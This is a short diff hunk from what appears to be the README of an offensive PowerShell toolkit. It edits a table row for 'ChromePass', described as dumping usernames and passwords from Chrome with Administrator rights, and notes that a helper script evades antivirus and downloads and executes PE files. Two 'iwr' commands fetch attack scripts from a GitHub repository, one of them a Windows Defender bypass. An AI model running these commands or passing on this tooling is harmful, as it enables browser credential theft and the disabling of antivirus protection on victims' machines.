@@ -49,7 +49,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-B
    
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|ChromePass|dumps usernames, passwords from chrome|Administrator|Invoke-Exclusions.ps1 downloads\evade AV|
+|ChromePass|dumps usernames, passwords from chrome|Administrator|Invoke-Exclusions.ps1 - Evade AV\Download PE\Exec PE|
 
 ```powershell
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-bypass/Invoke-Exclusions.ps1" -OutFile "Invoke-Exclusions.ps1"
